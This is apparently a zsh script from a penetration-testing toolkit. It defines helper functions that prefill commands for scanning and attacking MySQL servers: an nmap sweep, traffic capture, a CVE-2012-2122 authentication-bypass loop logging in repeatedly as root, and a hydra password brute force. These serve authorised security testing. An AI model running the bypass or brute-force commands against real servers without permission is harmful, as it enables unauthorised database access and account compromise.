#!/usr/bin/env zsh

############################################################# 
# qq-enum-mmysql
#############################################################

qq-enum-mysql-help() {
  cat << "DOC"

qq-enum-mysql
-------------
The qq-enum-mysql namespace contains commands for scanning and 
enumerating mysql server services and databases.

Commands
--------
qq-enum-mysql-install:             installs dependencies
qq-enum-mysql-nmap-sweep:          scan a network for services
qq-enum-mysql-tcpdump:             capture traffic to and from a host
qq-enum-mysql-client:              connect using the mysql client
qq-enum-mysql-auth-bypass:         attempt auth bypass
qq-enum-mysql-hydra:               brute force passwords for a user account

DOC
}

qq-enum-mysql-install() {

  __pkgs tcpdump nmap mysql

}

qq-enum-mysql-nmap-sweep() {
  __check-project
  qq-vars-set-network
  print -z "sudo nmap -n -Pn -sS -p 3306 ${__NETWORK} -oA $(__netpath)/mysql-sweep"
}

qq-enum-mysql-tcpdump() {
  __check-project
  qq-vars-set-iface
  qq-vars-set-rhost
  print -z "sudo tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 3306 -w $(__hostpath)/mysql.pcap"
}

qq-enum-mysql-client(){
  qq-vars-set-rhost
  __check-user
  print -z "mysql -u ${__USER} -p -h ${__RHOST}"
}

qq-enum-mysql-auth-bypass() {
  qq-vars-set-rhost
  __info "CVE-2012-2122"
  print -z "for i in {1..1000}; do mysql -u root --password=bad -h ${__RHOST} 2>/dev/null; done"
}

qq-enum-mysql-hydra() {
  __check-project
  qq-vars-set-rhost
  __check-user
  local db && __prefill db DATABASE mysql
  print -z "hydra -l ${__USER} -P ${__PASSLIST} -e -o $(__hostpath)/mysql-hydra-brute.txt ${__RHOST} MYSQL ${db}"
}
